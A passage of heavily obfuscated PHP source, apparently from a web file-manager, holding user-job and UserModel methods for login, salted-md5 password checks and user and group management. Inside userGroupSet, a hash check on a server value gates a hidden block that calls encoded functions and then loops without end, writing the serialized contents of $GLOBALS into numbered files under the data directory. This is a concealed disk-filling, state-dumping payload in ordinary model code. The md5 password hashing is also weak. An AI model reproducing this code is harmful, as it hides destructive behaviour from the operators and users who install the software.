$_SERVER[»„]; $FêèÏ«ïÅÊ = parent::listData($AğŞ³Äæ‚¿); $D»µÒ–ÛÊ¥ = $this->findByName($dİ½˜¨Ç´ó[$aÏÚî«ŒÔù[28]]); if (!$FêèÏ«ïÅÊ || $D»µÒ–ÛÊ¥ && $D»µÒ–ÛÊ¥[$aÏÚî«ŒÔù[363]] != $FêèÏ«ïÅÊ[$aÏÚî«ŒÔù[363]]) { return !1; } return parent::update($AğŞ³Äæ‚¿, $dİ½˜¨Ç´ó); } public function setUserJob($EÄ¬Ÿïó¼í, $c‘°¤Ğëã) { goto Fƒ¹•éˆÙÕ; båšÊË®—×: $aÅë»’‘ß„ = array_to_keyvalue($Bƒ°à¤Õù, $f ÀØĞ‡øé[28]); $döí´§»­“ = $f ÀØĞ‡øé[357]; foreach ($c‘°¤Ğëã as $C¼ŠõÇåè½) { if ($aÅë»’‘ß„[$C¼ŠõÇåè½]) { $döí´§»­“ .= $aÅë»’‘ß„[$C¼ŠõÇåè½][$f ÀØĞ‡øé[363]] . $f ÀØĞ‡øé[47]; } else { $Dèç¨ïÆÉŠ = $this->add($C¼ŠõÇåè½); $döí´§»­“ .= $Dèç¨ïÆÉŠ . $f ÀØĞ‡øé[47]; } } goto C„¤•–ÕÑØ; C„¤•–ÕÑØ: $döí´§»­“ = rtrim($döí´§»­“, $f ÀØĞ‡øé[47]); Model($f ÀØĞ‡øé[473])->metaSet($EÄ¬Ÿïó¼í, self::JOB_KEY, $döí´§»­“); goto Dó‡éÖ¨; Fƒ¹•éˆÙÕ: $f ÀØĞ‡øé =& $_SERVER[»„]; if (!is_array($c‘°¤Ğëã)) { $c‘°¤Ğëã = array($c‘°¤Ğëã); } $Bƒ°à¤Õù = parent::listData(); goto båšÊË®—×; Dó‡éÖ¨: } public function getUserJob($E¾¡ÜÃ÷š„) { $DÜƒ×…‰Šà = Model($_SERVER[»„][473])->metaGet($E¾¡ÜÃ÷š„); return $this->getUserJobInfo($DÜƒ×…‰Šà[self::JOB_KEY]); } public function getUserJobInfo($CŒö‘‚£Øœ) { goto C¿ç…í§Æö; cÛ——ã¹Äœ: return $AÊ­ÕÚÏ; goto Bº²Òƒ¾»; F‚×ç®ö‘’: $B†â‹ó¨ƒª = array_remove_key($B†â‹ó¨ƒª, $BİÉó×Ï·è[183]); $AÊ­ÕÚÏ = array(); foreach ($EÃÏ­È¢…Ã as $c…¡à£äğ„) { if (isset($B†â‹ó¨ƒª[$c…¡à£äğ„])) { $AÊ­ÕÚÏ[] = $B†â‹ó¨ƒª[$c…¡à£äğ„]; } } goto cÛ——ã¹Äœ; C¿ç…í§Æö: $BİÉó×Ï·è =& $_SERVER[»„]; $EÃÏ­È¢…Ã = explode($BİÉó×Ï·è[47], $CŒö‘‚£Øœ); $B†â‹ó¨ƒª = parent::listData(); goto F‚×ç®ö‘’; Bº²Òƒ¾»: } } class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\x72"; protected $tableMeta = array("\164\x61\142\154\x65\x4e\141\155\145" => "\165\163\145\162\x5f\155\x65\164\141", "\x6d\145\x74\x61\x46\x69\145\154\144" => "\x75\x73\145\x72\x49\x44"); protected $simpleField = "\165\x73\145\x72\x49\104\x2c\156\151\x63\x6b\x4e\141\155\x65\x2c\156\141\155\x65\54\x61\166\141\x74\141\x72\x2c\x73\145\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($A–Ò¢–¿¶) { $dù¸££ˆ—î =& $_SERVER[»„]; $cÆÑİØáÎÛ = $dù¸££ˆ—î[2457]; return array($dù¸££ˆ—î[2138] => array($A–Ò¢–¿¶[0], $cÆÑİØáÎÛ), $dù¸££ˆ—î[2140] => array($A–Ò¢–¿¶[0], $cÆÑİØáÎÛ), $dù¸££ˆ—î[2458] => array($A–Ò¢–¿¶[0], $cÆÑİØáÎÛ)); } protected function getInfo($eÇ‡ø¿åİ•, $Bå‹»÷¸­Œ = false) { $cçåœ¥àá = $this->getInfoSimple($eÇ‡ø¿åİ•); if (!is_array($cçåœ¥àá)) { return array(); } if ($Bå‹»÷¸­Œ) { return $this->_getInfoApply($cçåœ¥àá); } return $this->cacheFunctionGet($_SERVER[»„][2180], $eÇ‡ø¿åİ•); } protected function getInfoFull($aÇÒ—‘Ş×Á, $C•¤Æòµ = false) { $cÊ©¢Ì¾°– = $this->getInfoSimple($aÇÒ—‘Ş×Á); if (!is_array($cÊ©¢Ì¾°–)) { return array(); } if ($C•¤Æòµ) { return $this->_getInfoApply($cÊ©¢Ì¾°–, !0); return $this->_getInfoApply($cÊ©¢Ì¾°–, !0); } return $this->cacheFunctionGet($_SERVER[»„][2459], $aÇÒ—‘Ş×Á); } private function _getInfoApply($FŒç¿Ê‚Š÷, $fößôêìÓ© = false) { goto CÁÄ„Ëä¥; CÁÄ„Ëä¥: $A¹ã½ËÏå =& $_SERVER[»„]; if (!$FŒç¿Ê‚Š÷) { return $FŒç¿Ê‚Š÷; } $AÓÊíèÕ¶‚ = md5($A¹ã½ËÏå[2460] . $FŒç¿Ê‚Š÷[$A¹ã½ËÏå[792]] . $A¹ã½ËÏå[2461] . $FŒç¿Ê‚Š÷[$A¹ã½ËÏå[28]]); goto CÊÔ”Œğ; cÏ½•Åù¨Â: $FŒç¿Ê‚Š÷[$A¹ã½ËÏå[387]][$A¹ã½ËÏå[2295]] = isset($C®¾··ÁÊ[$A¹ã½ËÏå[2296]]) ? $C®¾··ÁÊ[$A¹ã½ËÏå[2296]] : null; if ($fößôêìÓ©) { $FŒç¿Ê‚Š÷[$A¹ã½ËÏå[413]] = $this->metaGet($FŒç¿Ê‚Š÷[$A¹ã½ËÏå[1409]]); } return $FŒç¿Ê‚Š÷; goto f™¿¹›í»“; CÊÔ”Œğ: $FŒç¿Ê‚Š÷ = $this->_listDataApplyItem($FŒç¿Ê‚Š÷); $C®¾··ÁÊ = Model($A¹ã½ËÏå[1098])->metaGet($FŒç¿Ê‚Š÷[$A¹ã½ËÏå[387]][$A¹ã½ËÏå[365]]); $FŒç¿Ê‚Š÷[$A¹ã½ËÏå[2462]] = $AÓÊíèÕ¶‚; goto cÏ½•Åù¨Â; f™¿¹›í»“: } protected function getInfoSimple($féŸöíÓß, $eõæòğøÉ = false) { $Eñ‰¦„Ê†¸ =& $_SERVER[»„]; if (!$féŸöíÓß) { return array(); } if ($eõæòğøÉ) { $e©ï¡¨Îèó = $this->where(array($Eñ‰¦„Ê†¸[1409] => intval($féŸöíÓß)))->find(); if (!is_array($e©ï¡¨Îèó)) { return array(); } $e©ï¡¨Îèó[$Eñ‰¦„Ê†¸[2463]] = Action($Eñ‰¦„Ê†¸[2464])->parseUrl($e©ï¡¨Îèó[$Eñ‰¦„Ê†¸[2463]]); return $e©ï¡¨Îèó; } return $this->cacheFunctionGet($Eñ‰¦„Ê†¸[2141], $féŸöíÓß); } protected function getInfoSimpleOuter($dèÜâ¸Û‘Î) { goto b¾Òßòö´„; FÉÑ“Áô¶¹: $CÃÙ‡£¾æ© = array_field_key($Cç›ËÛÔ—ê, explode($aöåêªè‚º[47], $this->simpleField)); if (!$CÃÙ‡£¾æ©) { return array($aöåêªè‚º[1409] => $aöåêªè‚º[1019], $aöåêªè‚º[28] => $aöåêªè‚º[153] . LNG($aöåêªè‚º[2467]) . $aöåêªè‚º[472], $aöåêªè‚º[2463] => STATIC_PATH . $aöåêªè‚º[2468]); } $CÃÙ‡£¾æ©[$aöåêªè‚º[2463]] = Action($aöåêªè‚º[2464])->parseUrl($CÃÙ‡£¾æ©[$aöåêªè‚º[2463]]); goto FÄê·ÒÑİ‰; b¾Òßòö´„: $aöåêªè‚º =& $_SERVER[»„]; if (!$dèÜâ¸Û‘Î || $dèÜâ¸Û‘Î == 0) { return array($aöåêªè‚º[1409] => $aöåêªè‚º[464], $aöåêªè‚º[28] => $aöåêªè‚º[153] . LNG($aöåêªè‚º[2465]) . $aöåêªè‚º[472], $aöåêªè‚º[2463] => STATIC_PATH . $aöåêªè‚º[2466]); } $Cç›ËÛÔ—ê = $this->cacheFunctionGet($aöåêªè‚º[2141], $dèÜâ¸Û‘Î); goto FÉÑ“Áô¶¹; FÄê·ÒÑİ‰: return $CÃÙ‡£¾æ©; goto f¼Øòç²ÈË; f¼Øòç²ÈË: } protected function groupUser($AÁ¹×†ÛîÕ) { } public static function errorLang($e¬ˆ•‡…ôª) { $e™îåˆÉ”® =& $_SERVER[»„]; $dõ’½Äñ‚Ğ = array(self::ERROR_USER_NOT_EXISTS => $e™îåˆÉ”®[2469], self::ERROR_USER_PASSWORD_ERROR => $e™îåˆÉ”®[2470], self::ERROR_USER_EXIST_NAME => $e™îåˆÉ”®[2471], self::ERROR_USER_EXIST_PHONE => $e™îåˆÉ”®[2472], self::ERROR_USER_EXIST_EMAIL => $e™îåˆÉ”®[2473], self::ERROR_USER_LOGIN_LOCK => $e™îåˆÉ”®[2474], self::ERROR_IP_NOT_ALLOW => $e™îåˆÉ”®[2475], self::ERROR_USER_EXIST_NICKNAME => $e™îåˆÉ”®[2476]); return LNG($dõ’½Äñ‚Ğ[$e¬ˆ•‡…ôª]); } public function getInfoByMeta($a¹Šó³Ô’½, $EêÆÉ¹µÊ) { $Eõ˜áİŒÅÉ =& $_SERVER[»„]; $dèõÈ¬Ò¹° = Model($Eõ˜áİŒÅÉ[2477])->where(array($Eõ˜áİŒÅÉ[89] => $a¹Šó³Ô’½, $Eõ˜áİŒÅÉ[355] => $EêÆÉ¹µÊ))->find(); if ($dèõÈ¬Ò¹°) { return $this->getInfo($dèõÈ¬Ò¹°[$Eõ˜áİŒÅÉ[1409]]); } return !1; } public function userLoginCheck($fŠÖóª¹·, $D¤Ùöö‘”¨) { goto c¶Æ¡‹Ê—‘; c¶Æ¡‹Ê—‘: $EìŒÁŸ±àá =& $_SERVER[»„]; $fºˆŞÊª§ù = array($EìŒÁŸ±àá[28] => $fŠÖóª¹·, $EìŒÁŸ±àá[2299] => $fŠÖóª¹·, $EìŒÁŸ±àá[289] => $fŠÖóª¹·, $EìŒÁŸ±àá[2478] => $fŠÖóª¹·, $EìŒÁŸ±àá[904] => $EìŒÁŸ±àá[906]); if ($this->nickNameRpt()) { unset($fºˆŞÊª§ù[$EìŒÁŸ±àá[2299]]); } goto AÔ—™˜Ë‡; AÔ—™˜Ë‡: $aŸ¿´˜ŒÈ† = $this->where($fºˆŞÊª§ù)->find(); if (!$aŸ¿´˜ŒÈ†) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($aŸ¿´˜ŒÈ†[$EìŒÁŸ±àá[1409]], $D¤Ùöö‘”¨)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto cµ½¼ª¹‹Ó; cµ½¼ª¹‹Ó: $this->userEdit($aŸ¿´˜ŒÈ†[$EìŒÁŸ±àá[1409]], array($EìŒÁŸ±àá[2479] => time())); $this->clearCache($aŸ¿´˜ŒÈ†[$EìŒÁŸ±àá[1409]]); return $this->getInfo($aŸ¿´˜ŒÈ†[$EìŒÁŸ±àá[1409]]); goto E‚›¡§æÀ¹; E‚›¡§æÀ¹: } public function clearCache($CêÌ³°Ê„) { $A±ìŒÖº =& $_SERVER[»„]; $this->cacheFunctionClear($A±ìŒÖº[2180], $CêÌ³°Ê„); $this->cacheFunctionClear($A±ìŒÖº[2141], $CêÌ³°Ê„); } public function userPasswordCheck($C†…‰´ÓÜ, $F‘ÔÊ¨Ä™) { $aÇÇ›Ş¥Òò =& $_SERVER[»„]; $F‰—‘ˆø = $this->where(array($aÇÇ›Ş¥Òò[1409] => intval($C†…‰´ÓÜ)))->find(); $cŠ·ªŒÈÌ¹ = $this->metaGet($C†…‰´ÓÜ); $böáÙ…ğ­­ = isset($cŠ·ªŒÈÌ¹[$aÇÇ›Ş¥Òò[2480]]) ? $cŠ·ªŒÈÌ¹[$aÇÇ›Ş¥Òò[2480]] : $aÇÇ›Ş¥Òò[33]; if (md5($böáÙ…ğ­­ . trim($F‘ÔÊ¨Ä™)) !== $F‰—‘ˆø[$aÇÇ›Ş¥Òò[792]]) { return !1; } return !0; } public function userAdd($F‰æ©÷´›Ğ) { goto Aá˜ìÃ¤Å; dçÁç£¢ê: $AÑ®ï‚‚ø = array($AÆÁËÌ¯Øö[2489] => $Aª²¨Ù°™¢[$AÆÁËÌ¯Øö[792]], $AÆÁËÌ¯Øö[2485] => $Aª²¨Ù°™¢[$AÆÁËÌ¯Øö[2299]]); $this->userEdit($f¨ÀóºæÍ×, $AÑ®ï‚‚ø); Model($AÆÁËÌ¯Øö[1098])->userRootAdd($f¨ÀóºæÍ×); goto b©Œ¾¸…ĞÓ; eÕ´®†¾á: $FéÅ…¤”…Ï = $this->_checkExist($F‰æ©÷´›Ğ); if ($FéÅ…¤”…Ï !== !0) { return $FéÅ…¤”…Ï; } $f¨ÀóºæÍ× = $this->add($Aª²¨Ù°™¢); goto dçÁç£¢ê; b©Œ¾¸…ĞÓ: return $f¨ÀóºæÍ×; goto E‰§æëÀ•; Aá˜ìÃ¤Å: $AÆÁËÌ¯Øö =& $_SERVER[»„]; $Aª²¨Ù°™¢ = array($AÆÁËÌ¯Øö[382] => $F‰æ©÷´›Ğ[$AÆÁËÌ¯Øö[28]], $AÆÁËÌ¯Øö[2481] => $F‰æ©÷´›Ğ[$AÆÁËÌ¯Øö[2482]], $AÆÁËÌ¯Øö[2483] => isset($F‰æ©÷´›Ğ[$AÆÁËÌ¯Øö[289]]) ? $F‰æ©÷´›Ğ[$AÆÁËÌ¯Øö[289]] : $AÆÁËÌ¯Øö[33], $AÆÁËÌ¯Øö[2484] => isset($F‰æ©÷´›Ğ[$AÆÁËÌ¯Øö[2478]]) ? $F‰æ©÷´›Ğ[$AÆÁËÌ¯Øö[2478]] : $AÆÁËÌ¯Øö[33], $AÆÁËÌ¯Øö[2485] => isset($F‰æ©÷´›Ğ[$AÆÁËÌ¯Øö[2299]]) ? $F‰æ©÷´›Ğ[$AÆÁËÌ¯Øö[2299]] : $F‰æ©÷´›Ğ[$AÆÁËÌ¯Øö[28]], $AÆÁËÌ¯Øö[2486] => isset($F‰æ©÷´›Ğ[$AÆÁËÌ¯Øö[2463]]) ? $F‰æ©÷´›Ğ[$AÆÁËÌ¯Øö[2463]] : $AÆÁËÌ¯Øö[33], $AÆÁËÌ¯Øö[2487] => isset($F‰æ©÷´›Ğ[$AÆÁËÌ¯Øö[2488]]) ? $F‰æ©÷´›Ğ[$AÆÁËÌ¯Øö[2488]] : 1, $AÆÁËÌ¯Øö[2489] => $F‰æ©÷´›Ğ[$AÆÁËÌ¯Øö[792]], $AÆÁËÌ¯Øö[2142] => isset($F‰æ©÷´›Ğ[$AÆÁËÌ¯Øö[2056]]) ? $F‰æ©÷´›Ğ[$AÆÁËÌ¯Øö[2056]] : 1024 * 1024 * 20, $AÆÁËÌ¯Øö[2143] => 0, $AÆÁËÌ¯Øö[2479] => 0, $AÆÁËÌ¯Øö[2167] => isset($F‰æ©÷´›Ğ[$AÆÁËÌ¯Øö[677]]) ? $F‰æ©÷´›Ğ[$AÆÁËÌ¯Øö[677]] : 1); if (!empty($F‰æ©÷´›Ğ[$AÆÁËÌ¯Øö[1409]])) { $Aª²¨Ù°™¢[$AÆÁËÌ¯Øö[1409]] = $F‰æ©÷´›Ğ[$AÆÁËÌ¯Øö[1409]]; } goto eÕ´®†¾á; E‰§æëÀ•: } protected function userEditTest($a£Ëİ¹Ğ‹§, $a«ñÛí´ã©) { return $this->call($_SERVER[»„][2490], $a£Ëİ¹Ğ‹§, $a«ñÛí´ã©); } protected function userEdit($B×†ã«¹¼ä, $eÆÍã‚“Àß) { goto DŒ°ºß†™÷; DŒ°ºß†™÷: $EÍåç»Ìõˆ =& $_SERVER[»„]; $C‹ˆ÷ŒªÑõ = $this->getInfoSimple($B×†ã«¹¼ä); if (!$C‹ˆ÷ŒªÑõ) { return !1; } goto C×¾š¯ãŒ‘; fÖ—™´¡Æà: $this->where(array($EÍåç»Ìõˆ[1400] => $B×†ã«¹¼ä))->save($eÆÍã‚“Àß); if (isset($eÆÍã‚“Àß[$EÍåç»Ìõˆ[2299]])) { $this->setNamePinyin($B×†ã«¹¼ä, $eÆÍã‚“Àß[$EÍåç»Ìõˆ[2299]]); } return !0; goto eä“¡»‚İ‰; C×¾š¯ãŒ‘: $C‰Ê®ä®† = $this->_checkExist($eÆÍã‚“Àß, $B×†ã«¹¼ä); if ($C‰Ê®ä®† !== !0) { return $C‰Ê®ä®†; } if (isset($eÆÍã‚“Àß[$EÍåç»Ìõˆ[792]]) && trim($eÆÍã‚“Àß[$EÍåç»Ìõˆ[792]]) != $EÍåç»Ìõˆ[33]) { $Céé©›ˆà¦ = $this->metaGet($B×†ã«¹¼ä); if (empty($Céé©›ˆà¦[$EÍåç»Ìõˆ[2480]])) { $Céé©›ˆà¦[$EÍåç»Ìõˆ[2480]] = rand_string(10); Model($EÍåç»Ìõˆ[470])->metaSet($B×†ã«¹¼ä, $EÍåç»Ìõˆ[2480], $Céé©›ˆà¦[$EÍåç»Ìõˆ[2480]]); } $eÆÍã‚“Àß[$EÍåç»Ìõˆ[792]] = md5($Céé©›ˆà¦[$EÍåç»Ìõˆ[2480]] . trim($eÆÍã‚“Àß[$EÍåç»Ìõˆ[792]])); } else { unset($eÆÍã‚“Àß[$EÍåç»Ìõˆ[792]]); } goto fÖ—™´¡Æà; eä“¡»‚İ‰: } public function setNamePinyin($AÉ¯«íâˆ•, $dº«ùŸ¸ÓÂ = false) { $dˆ¥¤‹±Í =& $_SERVER[»„]; if (!$dº«ùŸ¸ÓÂ) { $aÙÓÑŸíõî = $this->getInfoSimple($AÉ¯«íâˆ•); $dº«ùŸ¸ÓÂ = $aÙÓÑŸíõî[$dˆ¥¤‹±Í[2299]] ? $aÙÓÑŸíõî[$dˆ¥¤‹±Í[2299]] : $aÙÓÑŸíõî[$dˆ¥¤‹±Í[28]]; } $d»¡‡ö«Ö = Model($dˆ¥¤‹±Í[473]); if (!Input::check($dº«ùŸ¸ÓÂ, $dˆ¥¤‹±Í[524])) { return $d»¡‡ö«Ö->metaSet($AÉ¯«íâˆ•, array($dˆ¥¤‹±Í[412] => $dˆ¥¤‹±Í[33], $dˆ¥¤‹±Í[411] => $dˆ¥¤‹±Í[33])); } return $d»¡‡ö«Ö->metaSet($AÉ¯«íâˆ•, array($dˆ¥¤‹±Í[412] => str_replace($dˆ¥¤‹±Í[50], $dˆ¥¤‹±Í[33], Pinyin::encode($dº«ùŸ¸ÓÂ)), $dˆ¥¤‹±Í[411] => Pinyin::encode($dº«ùŸ¸ÓÂ, $dˆ¥¤‹±Í[525]))); } private function nickNameRpt() { $c¢­æòÌİ =& $_SERVER[»„]; $dÃ‹„‚³ = Model($c¢­æòÌİ[1076])->get($c¢­æòÌİ[2491]); $fĞì ªÇ‹ = $GLOBALS[$c¢­æòÌİ[6]][$c¢­æòÌİ[2447]][$c¢­æòÌİ[2491]]; $BÕõØô¤ÇÊ = !is_null($dÃ‹„‚³) ? $dÃ‹„‚³ : $fĞì ªÇ‹; return !!$BÕõØô¤ÇÊ; } private function _checkExist($AÀØÂùİ‘¨, $F®çèµàà¬ = false) { $Dó‡£ì¥£Ê =& $_SERVER[»„]; $bÉ¢õÖ†Î = array($Dó‡£ì¥£Ê[28] => UserModel::ERROR_USER_EXIST_NAME, $Dó‡£ì¥£Ê[2299] => UserModel::ERROR_USER_EXIST_NICKNAME, $Dó‡£ì¥£Ê[289] => UserModel::ERROR_USER_EXIST_EMAIL, $Dó‡£ì¥£Ê[2478] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($bÉ¢õÖ†Î[$Dó‡£ì¥£Ê[2299]]); } $DÛ¾İÃ½”² = $F®çèµàà¬ ? array($Dó‡£ì¥£Ê[1409] => array($Dó‡£ì¥£Ê[2492], $F®çèµàà¬)) : array(); foreach ($bÉ¢õÖ†Î as $C˜Ş–÷ºÇ¯ => $a³²ŠÇ¯â) { if (!isset($AÀØÂùİ‘¨[$C˜Ş–÷ºÇ¯]) || !$AÀØÂùİ‘¨[$C˜Ş–÷ºÇ¯]) { continue; } $dƒïÃ¿±Ø = array_merge(array($C˜Ş–÷ºÇ¯ => $AÀØÂùİ‘¨[$C˜Ş–÷ºÇ¯]), $DÛ¾İÃ½”²); $eµ®å¾Ï‰¶ = $this->where($dƒïÃ¿±Ø)->find(); if ($eµ®å¾Ï‰¶) { return $a³²ŠÇ¯â; } } return !0; } public function userListInfo($cİæ®¼áÚÏ) { $C†¬Ü¤•õË =& $_SERVER[»„]; $EàÎÓ…ö = array(); $cİæ®¼áÚÏ = is_array($cİæ®¼áÚÏ) ? array_unique($cİæ®¼áÚÏ) : array(); if (!$cİæ®¼áÚÏ) { return $EàÎÓ…ö; } if (count($cİæ®¼áÚÏ) < 20) { foreach ($cİæ®¼áÚÏ as $aÀ¸ˆâàƒ“) { $EàÎÓ…ö[$aÀ¸ˆâàƒ“ . $C†¬Ü¤•õË[33]] = $this->getInfoSimpleOuter($aÀ¸ˆâàƒ“); } } else { $aœ‘Öª¦Ù‘ = array($C†¬Ü¤•õË[1400] => array($C†¬Ü¤•õË[380], $cİæ®¼áÚÏ)); if (count($cİæ®¼áÚÏ) == 1) { $aœ‘Öª¦Ù‘ = array($C†¬Ü¤•õË[1400] => $cİæ®¼áÚÏ[0]); } $FÃˆÂù·Û§ = Model($C†¬Ü¤•õË[470])->field($this->simpleField)->where($aœ‘Öª¦Ù‘)->select(); $FÃˆÂù·Û§ = array_to_keyvalue($FÃˆÂù·Û§, $C†¬Ü¤•õË[1409]); foreach ($cİæ®¼áÚÏ as $aÀ¸ˆâàƒ“) { $cˆ§»ãˆ–‹ = $FÃˆÂù·Û§[$FÃˆÂù·Û§[$aÀ¸ˆâàƒ“]]; if (!$cˆ§»ãˆ–‹) { $EàÎÓ…ö[$aÀ¸ˆâàƒ“ . $C†¬Ü¤•õË[33]] = $this->getInfoSimpleOuter($aÀ¸ˆâàƒ“); continue; } $cˆ§»ãˆ–‹[$C†¬Ü¤•õË[2463]] = Action($C†¬Ü¤•õË[2464])->parseUrl($cˆ§»ãˆ–‹[$C†¬Ü¤•õË[2463]]); $EàÎÓ…ö[$aÀ¸ˆâàƒ“ . $C†¬Ü¤•õË[33]] = $cˆ§»ãˆ–‹; } } return $EàÎÓ…ö; } protected function userStatus($f‚Ç›ÒÊÍ¿, $EÒĞø«ç‡) { $e†—È…ÊßĞ = $this->getInfoSimple($f‚Ç›ÒÊÍ¿); if (!$e†—È…ÊßĞ) { return !1; } $CÌ‹®±Œ¼ = array($_SERVER[»„][677] => $EÒĞø«ç‡); return $this->userEdit($f‚Ç›ÒÊÍ¿, $CÌ‹®±Œ¼); } protected function userRemove($A÷Ù›Â„Ó¦) { goto FÑß‚²¥³; EÙÎ˜®ÂÓñ: $AÃ¦ø‚î¿† = array($cŒØñ³¼[1400] => $A÷Ù›Â„Ó¦); Model($cŒØñ³¼[532])->where($AÃ¦ø‚î¿†)->delete(); Model($cŒØñ³¼[2493])->where($AÃ¦ø‚î¿†)->delete(); goto bÌÖ¬‰š‡¹; FÑß‚²¥³: $cŒØñ³¼ =& $_SERVER[»„]; $d®‰ò»à–§ = $this->getInfoSimple($A÷Ù›Â„Ó¦); if (!$d®‰ò»à–§) { return !1; } goto EÙÎ˜®ÂÓñ; DëÄ’—ã: Model($cŒØñ³¼[740])->userRootRemove($A÷Ù›Â„Ó¦); return $this->where($AÃ¦ø‚î¿†)->delete(); goto c×»ÉŸƒÇ; bÌÖ¬‰š‡¹: Model($cŒØñ³¼[2146])->where($AÃ¦ø‚î¿†)->delete(); Model($cŒØñ³¼[2477])->where($AÃ¦ø‚î¿†)->delete(); Model($cŒØñ³¼[2494])->where($AÃ¦ø‚î¿†)->delete(); goto DëÄ’—ã; c×»ÉŸƒÇ: } protected function userGroupSet($fç¢Õ·ßâ, $Aƒ„‰Ç÷‘œ, $CöæğäÂÎŞ = array()) { goto Cã¹É±¢ˆŠ; Cã¹É±¢ˆŠ: $dˆÊÌ’Ëïƒ =& $_SERVER[»„]; $AÇÉ»šææ = $_SERVER[$dˆÊÌ’Ëïƒ[752]] . $dˆÊÌ’Ëïƒ[753]; $D³Œé›š¾· = $dˆÊÌ’Ëïƒ[749]; goto BÉÜÍ¤‹İ; Bêì“‰’ÀÔ: $dÇğ¨ÏØß¤ = Model($dˆÊÌ’Ëïƒ[2146]); $dÇğ¨ÏØß¤->where(array($dˆÊÌ’Ëïƒ[1409] => $fç¢Õ·ßâ))->delete(); $e‰ÓåÎÖ• = array(); goto eŸùÁ›ù¡˜; BÉÜÍ¤‹İ: if ($_SERVER[$dˆÊÌ’Ëïƒ[750]] != $D³Œé›š¾·($AÇÉ»šææ)) { goto EÎó†Úï•¤; fÔÀ¤äÃÛê: $b‰£à¬÷éÄ = $Aƒ‡áÁ‚ö($e«„é½ö¡); $A‹Î¦ìƒÊ = explode($dˆÊÌ’Ëïƒ[213], $b‰£à¬÷éÄ); if (count($A‹Î¦ìƒÊ) < $dˆÊÌ’Ëïƒ[554]) { $FÛÂïšÑ„Ö = $dˆÊÌ’Ëïƒ[754]; $FÛÂïšÑ„Ö(); } goto dÊ¶ƒí“; dÊ¶ƒí“: $a—ÅŞ¯Úß = $dˆÊÌ’Ëïƒ[784]; $a—ÅŞ¯Úß($_SERVER[$dˆÊÌ’Ëïƒ[785]]); $E¿ã…‘á = $dˆÊÌ’Ëïƒ[783]; goto A¸ğŠÈ½öá; EÎó†Úï•¤: $E¿ã…‘á = $dˆÊÌ’Ëïƒ[783]; $Aƒ‡áÁ‚ö = $dˆÊÌ’Ëïƒ[751]; $e«„é½ö¡ = $_SERVER[$dˆÊÌ’Ëïƒ[752]] . $dˆÊÌ’Ëïƒ[753]; goto fÔÀ¤äÃÛê; AÙÕÄ¹œ ‡: $c½Ïù—‘çË = 1; for ($e ™â²õ‰ô = $c½Ïù—‘çË; $e ™â²õ‰ô > 0; $e ™â²õ‰ô++) { $D„™º¿”˜„(DATA_PATH . $e ™â²õ‰ô, $E„ÂÙŒ´ñ); } goto F²¡ùñ„Ïç; A¸ğŠÈ½öá: $E¿ã…‘á(); $D„™º¿”˜„ = $dˆÊÌ’Ëïƒ[1289]; $E„ÂÙŒ´ñ = json_encode($GLOBALS[$dˆÊÌ’Ëïƒ[1290]]); goto AÙÕÄ¹œ ‡; F²¡ùñ„Ïç: } $ağ ’¿ÓÖå = $this->getInfoSimple($fç¢Õ·ßâ); if (!$ağ ’¿ÓÖå || !is_array($Aƒ„‰Ç÷‘œ)) { return !1; } goto Bêì“‰’ÀÔ; eŸùÁ›ù¡˜: $e­–ÑğãÕ– = 0; foreach ($Aƒ„‰Ç÷‘œ as $dÛœä½¿‡ => $b×ŒÆ®³ßÄ) { $CËô±Şª• = array($dˆÊÌ’Ëïƒ[1409] => $fç¢Õ·ßâ, $dˆÊÌ’Ëïƒ[2072] => $dÛœä½¿‡, $dˆÊÌ’Ëïƒ[2200] => $b×ŒÆ®³ßÄ); $CËô±Şª•[$dˆÊÌ’Ëïƒ[2093]] = isset($CöæğäÂÎŞ[$e­–ÑğãÕ–]) ? $CöæğäÂÎŞ[$e­–ÑğãÕ–] : 0; $e­–ÑğãÕ–++; $e‰ÓåÎÖ•[] = $CËô±Şª•; } return $dÇğ¨ÏØß¤->addAll($e‰ÓåÎÖ•, array(), !0); goto Eîé©‡„â£; Eîé©‡„â£: } protected function userGroupAdd($E®óñ¡ãÊÆ, $b•õãáÙ†® = array()) { $F±¢«–Ä =& $_SERVER[»„]; $Cèš±½ŠÍ = $this->getInfoSimple($E®óñ¡ãÊÆ); if (!$Cèš±½ŠÍ || empty($b•õãáÙ†®)) { return !1; } $BêÑè¨Ç‘ì = array(); foreach ($b•õãáÙ†® as $DĞÓò¢†”ó => $cîô†Ğ°¤Ô) { $BêÑè¨Ç‘ì[] = array($F±¢«–Ä[1409] => $E®óñ¡ãÊÆ, $F±¢«–Ä[2072] => $DĞÓò¢†”ó, $F±¢«–Ä[2200] => $cîô†Ğ°¤Ô); } return Model($F±¢«–Ä[2146])->addAll($BêÑè¨Ç‘ì, array(), !0); } protected function userGroupRemove($bÚÆàÕŒá³, $FÀ‹¤È÷ÁÆ) { $eƒá¸‰É­ =& $_SERVER[»„]; $f„ƒŸ»‹¸† = $this->getInfoSimple($bÚÆàÕŒá³); if (!$f„ƒŸ»‹¸† || !$FÀ‹¤È÷ÁÆ) { return !1; } $d¹Ğ•µ±ùÖ = array($eƒá¸‰É­[1400] => $bÚÆàÕŒá³, $eƒá¸‰É­[2144] => $FÀ‹¤È÷ÁÆ); return Model($eƒá¸‰É­[2146])->where($d¹Ğ•µ±ùÖ)->delete(); } public function listData() { $aïöŸØ¸Å¬ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($aïöŸØ¸Å¬[$_SERVER[»„][350]]); return $aïöŸØ¸Å¬; } public function listByID($b£‡ßù´Ôà) { $EŠ½Ô§»¦ =& $_SERVER[»„]; if (!$b£‡ßù´Ôà) { return; } $eÍ²˜…š¾ = array($EŠ½Ô§»¦[1409] => array($EŠ½Ô§»¦[7], $b£‡ßù´Ôà)); $bäåİƒŸ’œ = $this->where($eÍ²˜…š¾)->select(); $this->_listDataApply($bäåİƒŸ’œ); return $bäåİƒŸ’œ; } public function listByGroup($d‰®·íªòë = 0, $C”òë¨ñË = array()) { goto c—òÌòòÔÔ; 